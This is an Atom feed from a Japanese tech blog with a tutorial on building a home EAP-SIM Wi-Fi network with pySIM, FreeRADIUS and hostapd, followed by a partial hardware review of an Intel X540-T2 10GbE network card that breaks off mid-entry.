<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[犬アイコンのみっきー]]></title>
  <link href="http://mzyy94.com/atom.xml" rel="self"/>
  <link href="http://mzyy94.com/"/>
  <updated>2016-10-09T15:57:07+09:00</updated>
  <id>http://mzyy94.com/</id>
  <author>
    <name><![CDATA[mzyy94]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[一般のご家庭向けEAP-SIM認証Wi-Fi]]></title>
    <link href="http://mzyy94.com/blog/2016/10/09/household-eap-sim-wifi/"/>
    <updated>2016-10-09T16:00:00+09:00</updated>
    <id>http://mzyy94.com/blog/2016/10/09/household-eap-sim-wifi</id>
    <content type="html"><![CDATA[<p>ご家庭のWi-Fi、まだパスワード認証ですか？</p>

<p>こんにちは。陽炎型航洋直接教育艦 晴風の艦長、岬明乃です。
昨日開催された<a href="http://www.kernelvm.org/">カーネル／VM探検隊</a>で、晴風の艦内無線LANの構築をした話をしてきました。</p>

<iframe src="https://www.slideshare.net/slideshow/embed_code/key/BGDboydffkwEnw" width="427" height="356" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe>


<p> <div style="margin-bottom:5px"> <strong> <a href="https://www.slideshare.net/mzyy94/subscriber-identity-module-66892458" title="Subscriber Identity Module" target="_blank">Subscriber Identity Module</a> </strong> from <strong><a target="_blank" href="http://www.slideshare.net/mzyy94">Yuki Mizuno</a></strong> </div></p>

<p>発表枠は手軽な20分だったこともあり、聞いていて飽きてしまうであろう詳細な構成方法などを省いたため、構築についての手順を書き記しておきます。</p>

<!-- more -->


<h1>実習期間中の艦内無線LAN事情</h1>

<p>晴風クラスに限らず、横須賀女子海洋学校の1年次の実習では30人前後の船員を乗せて航海に出ます。
艦の仲間のネットワークアクセスを管理するため、艦内無線LANでは802.1XによるWPA2エンタープライズ認証を設けるのがルールとなっています。
802.1X認証の方法は特に学校からの指定はなく、みんな好きなRADIUSサーバを建てて認証基盤を構築しています。
これも実習の一環というわけです。</p>

<p>晴風では、FreeRADIUSを採用し、EAP-TLSでみんなのユーザ名とパスワードをセットして使ってもらうつもりでした。
しかしです。このご時世、パスワードなる脆弱なものを利用するのは少数派なのです。
そこで主計科の子たちと一緒に考えた末、EAP-SIMによるパスワードレス認証を導入することとなりました。</p>

<h1>晴風艦内EAP-SIM認証Wi-Fi構築</h1>

<p>さて、実際に構築した手順を説明していきます。</p>

<h2>SIMカードの読み込み下準備</h2>

<p>ここで必要になるハードウェアは、PC/SCカードリーダとICカードアダプタ、SIMカード変換アダプタです。</p>

<p><a href="https://www.amazon.co.jp/Gemalto-%E3%82%B8%E3%82%A7%E3%83%A0%E3%82%A2%E3%83%AB%E3%83%88-IC%E3%82%AB%E3%83%BC%E3%83%89%E3%83%AA%E3%83%BC%E3%83%80%E3%83%BB%E3%83%A9%E3%82%A4%E3%82%BF-%E5%AF%BE%E5%BF%9C%E4%BD%8F%E5%9F%BA%E3%82%AB%E3%83%BC%E3%83%89%E7%94%A8PC-HWP119316/dp/B003XF2JJY/ref=as_li_ss_il?s=computers&ie=UTF8&qid=1475987930&sr=1-2&keywords=gemalto+%E3%82%AB%E3%83%BC%E3%83%89%E3%83%AA%E3%83%BC%E3%83%80&linkCode=li3&tag=mzyy-22&linkId=9d64adcf0113625ebf4f506686687dc6" target="_blank"><img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&ASIN=B003XF2JJY&Format=_SL250_&ID=AsinImage&MarketPlace=JP&ServiceVersion=20070822&WS=1&tag=mzyy-22" ></a><img src="https://ir-jp.amazon-adsystem.com/e/ir?t=mzyy-22&l=li3&o=9&a=B003XF2JJY" width="1" height="1" border="0" alt="" style="border:none !important; margin:0px !important;" /></p>

<p><a href="https://www.amazon.co.jp/gp/product/B00G1BJ5TY//ref=as_li_ss_il?&linkCode=li3&tag=mzyy-22&linkId=513e6f72dde319e4cdba6dc2aa22683a" target="_blank"><img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&ASIN=B00G1BJ5TY&Format=_SL250_&ID=AsinImage&MarketPlace=JP&ServiceVersion=20070822&WS=1&tag=mzyy-22" ></a><img src="https://ir-jp.amazon-adsystem.com/e/ir?t=mzyy-22&l=li3&o=9&a=B00G1BJ5TY" width="1" height="1" border="0" alt="" style="border:none !important; margin:0px !important;" /></p>

<p><a href="https://www.amazon.co.jp/Nano-MicroSIM-%E5%A4%89%E6%8F%9B%E3%82%A2%E3%83%80%E3%83%97%E3%82%BF-4%E7%82%B9%E3%82%BB%E3%83%83%E3%83%88-%E3%83%9B%E3%83%AF%E3%82%A4%E3%83%88/dp/B00PESJ072/ref=as_li_ss_il?s=electronics&ie=UTF8&qid=1475988345&sr=1-8&keywords=nanoSIM%E5%A4%89%E6%8F%9B%E3%82%A2%E3%83%80%E3%83%97%E3%82%BF%E3%83%BC&linkCode=li3&tag=mzyy-22&linkId=ffdb8e98f3f5b5db08bb78437cd00fc2" target="_blank"><img border="0" src="//ws-fe.amazon-adsystem.com/widgets/q?_encoding=UTF8&ASIN=B00PESJ072&Format=_SL250_&ID=AsinImage&MarketPlace=JP&ServiceVersion=20070822&WS=1&tag=mzyy-22" ></a><img src="https://ir-jp.amazon-adsystem.com/e/ir?t=mzyy-22&l=li3&o=9&a=B00PESJ072" width="1" height="1" border="0" alt="" style="border:none !important; margin:0px !important;" /></p>

<p>必要なソフトウェアは、</p>

<ul>
<li><a href="https://pcsclite.alioth.debian.org/pcsclite.html">PCSC Lite</a></li>
<li><a href="https://github.com/LudovicRousseau/pyscard">pyscard</a></li>
<li><a href="https://github.com/mzyy94/pysim">pySIM</a></li>
</ul>


<p>です。よしなにインストールしてくれればいいのですが、依存関係がごにょっとしてるのでDebianでのセットアップ例を挙げておきます。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ sudo apt-get install pcscd pcsc-tools libccid libpcsclite-dev
</span><span class='line'>$ sudo apt-get install python python-setuptools python-serial python-dev swig git
</span><span class='line'>$ mkdir -p ~/.cache/
</span><span class='line'>$ cd ~/.cache/
</span><span class='line'>$ curl -O http://ludovic.rousseau.free.fr/softwares/pcsc-tools/smartcard_list.txt
</span><span class='line'>$ git clone https://github.com/LudovicRousseau/pyscard /tmp/pyscard
</span><span class='line'>$ cd /tmp/pyscard
</span><span class='line'>$ sudo python setup.py build_ext install
</span><span class='line'>$ git clone https://github.com/mzyy94/pysim ~/pysim && cd ~/pysim</span></code></pre></td></tr></table></div></figure>


<h2>SIMへのアクセスの確認</h2>

<p>スライドで発表した通り、SIMにはいろいろな情報が詰まっています。
ICCIDやIMSIを確認してみたい場合は、pySIMの<code>pySim-read.py</code>を実行してみてください。情報がだばぁっとでてこれば成功です。
このとき、上記のGemaltoのICカードリーダを使っている場合は、<code>-p 0</code>オプションをつけることでリーダから読み込むことができます。</p>

<h2>FreeRADIUSのEAP-SIM設定</h2>

<p>発表スライドでは、simtriplets.datに認証情報を書き込む方法を記しました。
この方法は、Debianで<code>apt-get install freeradius</code>で入るバージョンやFreeRADIUSの標準ビルド設定では無効化されています。
晴風では多くの艦員のSIM認証情報を書き込むため、FreeRADIUSをソースからビルドしてsimtripletsの読み込みを有効化していました。</p>

<p>しかし、ご家庭では30を超える認証情報を追加することはほとんどないだろうということで、一般的なFreeRADIUSのユーザ設定と同じ方法を紹介します。</p>

<h3>EAP-SIM有効化</h3>

<p>EAP-SIMは標準では無効化されているので、これを有効化します。
有効化といっても大層なことはせず、設定ファイル<code>/etc/freeradius/eap.conf</code>に2行追加するだけですけどね。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='diff'><span class='line'><span class="gh">diff --git a/eap.conf b/eap.conf</span>
</span><span class='line'><span class="gh">index 797130d..435f7e6 100644</span>
</span><span class='line'><span class="gd">--- a/eap.conf</span>
</span><span class='line'><span class="gi">+++ b/eap.conf</span>
</span><span class='line'><span class="gu">@@ -15,6 +15,8 @@</span>
</span><span class='line'> #  See experimental.conf for documentation.
</span><span class='line'> #
</span><span class='line'>        eap {
</span><span class='line'><span class="gi">+               sim {</span>
</span><span class='line'><span class="gi">+               }</span>
</span><span class='line'>                #  Invoke the default supported EAP type when
</span><span class='line'>                #  EAP-Identity response is received.
</span><span class='line'>                #
</span></code></pre></td></tr></table></div></figure>


<p>有効化ついでにsecretも変えておくとわかりやすくていいですね。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='diff'><span class='line'><span class="gh">diff --git a/clients.conf b/clients.conf</span>
</span><span class='line'><span class="gh">index d5b1f74..036e053 100644</span>
</span><span class='line'><span class="gd">--- a/clients.conf</span>
</span><span class='line'><span class="gi">+++ b/clients.conf</span>
</span><span class='line'><span class="gu">@@ -98,7 +98,7 @@ client localhost {</span>
</span><span class='line'>        #  The default secret below is only for testing, and should
</span><span class='line'>        #  not be used in any real environment.
</span><span class='line'>        #
</span><span class='line'><span class="gd">-       secret          = testing123</span>
</span><span class='line'><span class="gi">+       secret          = eap-sim</span>
</span><span class='line'>
</span><span class='line'>        #
</span><span class='line'>        #  Old-style clients do not send a Message-Authenticator
</span></code></pre></td></tr></table></div></figure>


<h3>EAP-SIM認証情報の設定</h3>

<p>発表でも述べた通り、SIMの仕様書にあるコマンドを送ってチャレンジする認証情報を生成しなければいけません。
加えて、得た情報をFreeRADIUSのusersファイルの書式にしたがって編集する必要があります。
EAP-SIMのリクエストの仕様上、IMSIからHNIを推定してMCCとMNCを特定してユーザ名を作り上げるのは正直言って面倒です。</p>

<p>なのでコマンド一発でusersファイルが作成できるツールを<a href="https://github.com/mzyy94/pysim/">https://github.com/mzyy94/pysim/</a>に同梱してあります。
<code>./pySim-gen-eapsim-user.py</code>をバシっと叩いて一瞬でusersファイルを作れます。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='diff'><span class='line'>~/pysim$ ./pySim-gen-eapsim-user.py -p 0 | sudo tee -a /etc/freeradius/users
</span><span class='line'># IMSI: 440103152044102
</span><span class='line'># NTT DoCoMo Kansai Inc.
</span><span class='line'>1440103152044102@wlan.mnc010.mcc440.3gppnetwork.org  Auth-Type := EAP, EAP-Type := SIM
</span><span class='line'>        EAP-Sim-Rand1 = 0x6d58e5afebffe3f480738f104a74afb8,
</span><span class='line'>        EAP-Sim-SRES1 = 0xbd952f43,
</span><span class='line'>        EAP-Sim-KC1 = 0x610f35c9208e1448,
</span><span class='line'>        EAP-Sim-Rand2 = 0xc22413df2efea1e70197ea58519a72f0,
</span><span class='line'>        EAP-Sim-SRES2 = 0x90f003a1,
</span><span class='line'>        EAP-Sim-KC2 = 0x095001424f8fb62a,
</span><span class='line'>        EAP-Sim-Rand3 = 0x60a5dc16de844884dea914cd41113477,
</span><span class='line'>        EAP-Sim-SRES3 = 0xff0444b3,
</span><span class='line'>        EAP-Sim-KC3 = 0xcff6d25c04ab4474,
</span></code></pre></td></tr></table></div></figure>


<h2>無線LAN APの設定</h2>

<p>ここはみんな自前の無線LAN環境があると思うので、一例としてEAP-SIM認証が最低限動作するhostapdの構成を記しておきます。
詳しい設定項目などは、<a href="https://wiki.gentoo.org/wiki/Hostapd">Hostapd - Gentoo Wiki</a> をご参照ください。
また、<a href="https://www.amazon.co.jp/%E3%83%A4%E3%83%9E%E3%83%8F-Yamaha-WLX202-%EF%BC%BB%E7%84%A1%E7%B7%9ALAN%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%EF%BC%BD/dp/B01D2QBF02/ref=as_li_ss_tl?ie=UTF8&amp;qid=1475994913&amp;sr=8-1&amp;keywords=wlx202&amp;linkCode=ll1&amp;tag=mzyy-22&amp;linkId=367f85f6bf22e56c6ab5521d89450c6d">WLX 202</a>など、
お手持ちの無線LAN APで外部RADIUSサーバに対応しているものをお持ちであれば、FreeRADIUSのアドレスの指定とsecretの設定をすることで利用できるでしょう。</p>

<h3>hostapdの設定</h3>

<p>必要なツールのインストール<code>apt-get install hostapd bridge-utils</code>。
そして、<strong>/etc/network/interfaces</strong>をこんな感じに。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='diff'><span class='line'>source /etc/network/interfaces.d/*
</span><span class='line'>
</span><span class='line'>auto lo
</span><span class='line'>iface lo inet loopback
</span><span class='line'>
</span><span class='line'>allow-hotplug eth0
</span><span class='line'>iface eth0 inet manual
</span><span class='line'>
</span><span class='line'>allow-hotplug wlan0
</span><span class='line'>iface wlan0 inet manual
</span><span class='line'>
</span><span class='line'>auto br0
</span><span class='line'>iface br0 inet dhcp
</span><span class='line'>bridge_ports eth0
</span></code></pre></td></tr></table></div></figure>


<p>で、<strong>/etc/hostapd/hostapd.conf</strong>をこう。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='diff'><span class='line'>interface=wlan0
</span><span class='line'>bridge=br0
</span><span class='line'>driver=nl80211
</span><span class='line'>
</span><span class='line'>ctrl_interface=/var/run/hostapd
</span><span class='line'>ctrl_interface_group=0
</span><span class='line'>
</span><span class='line'>ssid=EAP-SIM_AP
</span><span class='line'>
</span><span class='line'>hw_mode=g
</span><span class='line'>channel=8
</span><span class='line'>
</span><span class='line'>eap_server=0 # Disable embedded eap server
</span><span class='line'>
</span><span class='line'># WPA2 Enterprise
</span><span class='line'>wpa=2
</span><span class='line'>ieee8021x=1
</span><span class='line'>wpa_key_mgmt=WPA-EAP
</span><span class='line'>rsn_pairwise=CCMP
</span><span class='line'>
</span><span class='line'># RADIUS authentication
</span><span class='line'>auth_algs=1
</span><span class='line'>auth_server_addr=127.0.0.1
</span><span class='line'>auth_server_port=1812
</span><span class='line'>auth_server_shared_secret=eap-sim
</span></code></pre></td></tr></table></div></figure>


<h2>自宅EAP-SIM無線LANアクセスポイントへの接続</h2>

<p>あとは<code>hostapd</code>を立ち上げて接続するだけ！とお思いでしょうが、残念ならがクライアント側にAPの登録が必要となることがあります。
iOSでは、WPA2 EnterpriseのアクセスポイントをデフォルトでEAP-TLSとして認識し、加えてiPhone/iPad側でEAP-SIMとして接続させる方法がありません。
立ち上げたAPがEAP-SIM認証であることを教え込むために、構成プロファイルを作成する必要があります。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/10/09/apple-configurator2.png" alt="apple configurator2" /></p>

<p>macOSが動く環境をお持ちの方は、<a href="https://itunes.apple.com/jp/app/apple-configurator-2/id1037126344?mt=12">Apple Configurator 2</a>で上図のように作成するか、
もしくは<em>EAP-SIM_AP</em>向けに作った以下の構成プロファイル（XMLファイル）のAP名を変更したものをiOSデバイスにインストールして準備完了です。</p>

<p><a href="http://mzyy94.com/blog/resources/data/2016/10/09/EAP-SIM_AP.mobileconfig">EAP-SIM_AP.mobileconfig</a></p>

<p>最後にお待ちかね、<code>hostapd /etc/hostapd/hostapd.conf</code>で起動させて接続してみましょう！</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='diff'><span class='line'>$ sudo hostapd /etc/hostapd/hostapd.conf
</span><span class='line'>Configuration file: /etc/hostapd/hostapd.conf
</span><span class='line'>Using interface wlan0 with hwaddr dc:fb:02:9b:11:ef and ssid &quot;EAP-SIM_AP&quot;
</span><span class='line'>wlan0: RADIUS Authentication server 127.0.0.1:1812
</span><span class='line'>wlan0: interface state UNINITIALIZED-&gt;ENABLED
</span><span class='line'>wlan0: AP-ENABLED
</span><span class='line'>wlan0: STA f4:0f:24:ea:95:13 IEEE 802.11: authenticated
</span><span class='line'>wlan0: STA f4:0f:24:ea:95:13 IEEE 802.11: associated (aid 1)
</span><span class='line'>wlan0: CTRL-EVENT-EAP-STARTED f4:0f:24:ea:95:13
</span><span class='line'>wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
</span><span class='line'>wlan0: STA f4:0f:24:ea:95:13 WPA: pairwise key handshake completed (RSN)
</span><span class='line'>wlan0: AP-STA-CONNECTED f4:0f:24:ea:95:13
</span><span class='line'>wlan0: STA f4:0f:24:ea:95:13 RADIUS: starting accounting session 57F9E33F-00000000
</span><span class='line'>wlan0: STA f4:0f:24:ea:95:13 IEEE 802.1X: authenticated - EAP type: 18 (SIM)
</span></code></pre></td></tr></table></div></figure>


<h1>まとめ</h1>

<p>海の仲間は家族だから！</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[1万円台の格安Intel X540-T2 10GbEを買ってみた]]></title>
    <link href="http://mzyy94.com/blog/2016/07/06/hello-10gbe-nic/"/>
    <updated>2016-07-06T03:24:50+09:00</updated>
    <id>http://mzyy94.com/blog/2016/07/06/hello-10gbe-nic</id>
    <content type="html"><![CDATA[<p>事の発端はこちらのツイート</p>

<blockquote class="twitter-tweet" data-lang="ja"><p lang="ja" dir="ltr">Amazonに出品されてる激安X540-T2（19000円）って本物なの、大丈夫なの</p>&mdash; ゆずはら (@yuzuhara) <a href="https://twitter.com/yuzuhara/status/749804710530392065">2016年7月4日</a></blockquote>


<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<blockquote class="twitter-tweet" data-lang="ja"><p lang="ja" dir="ltr">同じこと思っててまだ買えずにいる <a href="https://t.co/424csKrtVR">https://t.co/424csKrtVR</a></p>&mdash; ハイスクール・フリートが生きがい (@mzyy94) <a href="https://twitter.com/mzyy94/status/749821436919885824">2016年7月4日</a></blockquote>


<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<p>この低価格NICはずっと気になっていて、ほしいものリストにもずっと突っ込んでありました。
<img src="http://mzyy94.com/blog/resources/images/2016/07/06/wishlist.png" alt="Wishlistの画像" /></p>

<p>突っ込んだ当時の価格からずいぶんと安くなり、2016/07/04時点で2万円を切っていたので、以下のような煽りも受けたついでに2枚買ってみました。</p>

<blockquote class="twitter-tweet" data-lang="ja"><p lang="ja" dir="ltr">買って確かめてくれよ（懇願 <a href="https://t.co/bWfXoO153O">https://t.co/bWfXoO153O</a></p>&mdash; ゆずはら (@yuzuhara) <a href="https://twitter.com/yuzuhara/status/749824378876022784">2016年7月4日</a></blockquote>


<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<p>買って挙動を確かめてみたレポートです。</p>

<p><a href="https://www.amazon.co.jp/intel-X540T2-X540-T2/dp/B0077CS9UM/ref=sr_1_1?ie=UTF8&amp;qid=1467713812&amp;sr=8-1&amp;tag=mzyy-22">Amazon.co.jp： intel X540-T2: パソコン・周辺機器</a></p>

<!-- more -->


<h1>Intel X540-T2</h1>

<p><img src="http://mzyy94.com/blog/resources/images/2016/07/06/x540-t2.jpg" alt="NICの画像 form Intel" /></p>

<p><a href="http://ark.intel.com/ja/products/58954/Intel-Ethernet-Converged-Network-Adapter-X540-T2">Intel® Ethernet Converged Network Adapter X540-T2 仕様</a></p>

<p>一般のご家庭向けのデュアルポート10GbE NICです。
ark intelの希望カスタマー価格を見ると<em>$508.00 - $513.00</em>とあるように、執筆時の為替レートで考えても5万円は下らない代物です。
2012年発売から時が立っており、今年のQ1に後継となるX550-T2が発売されていることを考えると、価格が下がるのは納得ですが、
コンシューマー向けではない機器であるためそこまで値下がりは期待できないと思われていました。</p>

<p>それがついに1万円台で買えるとあって、これから一般のご家庭に急速に広まっていくNICの一つになることは間違いなしです。</p>

<p><a href="https://www.amazon.co.jp/intel-X540T2-X540-T2/dp/B0077CS9UM/ref=sr_1_1?ie=UTF8&amp;qid=1467713812&amp;sr=8-1&amp;tag=mzyy-22">Amazon.co.jp： intel X540-T2: パソコン・周辺機器</a></p>

<h1>購入＆到着</h1>

<p>購入を煽られてクレジットカードの締日を確認し、ポイント還元率の計算と締日が遠いカードの認証情報の登録を行って1時間ほど立ったあとにアマゾンポチｗ！</p>

<blockquote class="twitter-tweet" data-lang="ja"><p lang="ja" dir="ltr">買いました <a href="https://t.co/QauGkl8eQw">https://t.co/QauGkl8eQw</a></p>&mdash; ハイスクール・フリートが生きがい (@mzyy94) <a href="https://twitter.com/mzyy94/status/749832787960602624">2016年7月4日</a></blockquote>


<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<p>14時頃に発注して翌日12時頃に到着しました。さすがAmazonプライムお急ぎ便ですね。
<a href="https://www.amazon.co.jp/tryprimefree?tag=mzyy-22">Amazonプライムの入会はこちら</a></p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/07/06/amazon-prime.jpg" alt="箱の画像" /></p>

<p>Twitterでは「この安さ、偽物じゃないか？」と噂されていましたが、Intelロゴはちゃんとしたものでした。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/07/06/intel-haitteru.jpg" alt="Intelロゴの画像" /></p>

<p><a href="https://www.amazon.co.jp/intel-X540T2-X540-T2/dp/B0077CS9UM/ref=sr_1_1?ie=UTF8&amp;qid=1467713812&amp;sr=8-1&amp;tag=mzyy-22">Amazon.co.jp： intel X540-T2: パソコン・周辺機器</a></p>

<h1>セットアップ</h1>

<h2>環境</h2>

<p>以下の、A及びBの2台のマシンに導入しました。</p>

<p>A: 仮想マシン動かしてるやつ</p>

<table>
<thead>
<tr>
<th style="text-align:left;"> パーツ </th>
<th style="text-align:left;"> 種類</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left;"> CPU     </td>
<td style="text-align:left;"> Intel Xeon E3-1245v3 3.4GHz</td>
</tr>
<tr>
<td style="text-align:left;"> Memory  </td>
<td style="text-align:left;"> ECC DDR3-1600 16GB (8GB x 2)</td>
</tr>
<tr>
<td style="text-align:left;"> PCIe </td>
<td style="text-align:left;"> PCI Express 3.0</td>
</tr>
<tr>
<td style="text-align:left;"> OS </td>
<td style="text-align:left;"> ProxMox 4.2 (Debian Jessie 8.2)</td>
</tr>
<tr>
<td style="text-align:left;"> バージョン </td>
<td style="text-align:left;"> 4.4.6-1-pve</td>
</tr>
</tbody>
</table>


<p>B: NAS</p>

<table>
<thead>
<tr>
<th style="text-align:left;"> パーツ </th>
<th style="text-align:left;"> 種類</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left;"> CPU     </td>
<td style="text-align:left;"> Intel Core i5-2405S 2.5GHz</td>
</tr>
<tr>
<td style="text-align:left;"> Memory  </td>
<td style="text-align:left;"> DDR3-1600 16GB (8GB x 2)</td>
</tr>
<tr>
<td style="text-align:left;"> PCIe </td>
<td style="text-align:left;"> PCI Express 2.0</td>
</tr>
<tr>
<td style="text-align:left;"> OS </td>
<td style="text-align:left;"> Rockstor 3.8-14 (CentOS 7.2)</td>
</tr>
<tr>
<td style="text-align:left;"> バージョン </td>
<td style="text-align:left;"> 4.6.0-1.el7.elrepo.x86_64</td>
</tr>
</tbody>
</table>


<h3>NOTE: PCI Express 2.0とPCI Express 2.1の違いについて</h3>

<p>X540-T2はPCI Express 2.1以上の拡張カードスロットに対応しているため、Bの構成は非対応となっています。
マイナーバージョンアップ程度の変更ですが、3.0に盛り込む予定であった多くの機能をIntelが打診して無理やり2.1として出させたこともあって<em>[要出典]</em>、
数少ないPCI Express 2.1インターフェースを要求するこのNICもその追加機能を多く使っていると考えられます。</p>

<p>出典？：<a href="http://pc.watch.impress.co.jp/docs/news/event/380216.html">【イベントレポート】【PCI-SIG Developers Conference 2010レポート】 PCIe Specificationの詳細 - PC Watch</a></p>

<p>ただ、PCI Expressには下位互換性がサポートされているため、最高のパフォーマンスは出せないにしろ、動作すると予想されるため、Bの構成でも利用してみます。</p>

<h2>接続</h2>

<p>X540-T2と同時購入した<em><a href="https://www.amazon.co.jp/gp/product/B00ID1S8ZW/ref=oh_aui_detailpage_o00_s00?ie=UTF8&amp;tag=mzyy-22">こたつみたいなCAT7 LANケーブル</a></em>をそれぞれのポートに接続してこんな感じでつなげてみました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2016/07/06/connected.jpg" alt="つなげた図" /></p>

<p><a href="https://www.amazon.co.jp/intel-X540T2-X540-T2/dp/B0077CS9UM/ref=sr_1_1?ie=UTF8&amp;qid=1467713812&amp;sr=8-1&amp;tag=mzyy-22">Amazon.co.jp： intel X540-T2: パソコン・周辺機器</a></p>

<h2>認識</h2>

<p>とりあえずカーネルで標準で読み込まれてたドライバで認識しました。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@rockstor ~]# lspci -d 8086: | grep Ethernet
</span><span class='line'>01:00.0 Ethernet controller: Intel Corporation Ethernet Controller 10-Gigabit X540-AT2 (rev 01)
</span><span class='line'>01:00.1 Ethernet controller: Intel Corporation Ethernet Controller 10-Gigabit X540-AT2 (rev 01)
</span><span class='line'>[root@rockstor ~]#</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@rockstor ~]# lspci -k -s 01:00
</span><span class='line'>01:00.0 Ethernet controller: Intel Corporation Ethernet Controller 10-Gigabit X540-AT2 (rev 01)
</span><span class='line'>        Subsystem: Intel Corporation Ethernet Converged Network Adapter X540-T2
</span><span class='line'>        Kernel driver in use: ixgbe
</span><span class='line'>01:00.1 Ethernet controller: Intel Corporation Ethernet Controller 10-Gigabit X540-AT2 (rev 01)
</span><span class='line'>        Subsystem: Intel Corporation Ethernet Converged Network Adapter X540-T2
</span><span class='line'>        Kernel driver in use: ixgbe
</span><span class='line'>[root@rockstor ~]#</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@rockstor ~]# modinfo ixgbe | head -6
</span><span class='line'>filename:       /lib/modules/4.6.0-1.el7.elrepo.x86_64/kernel/drivers/net/ethernet/intel/ixgbe/ixgbe.ko
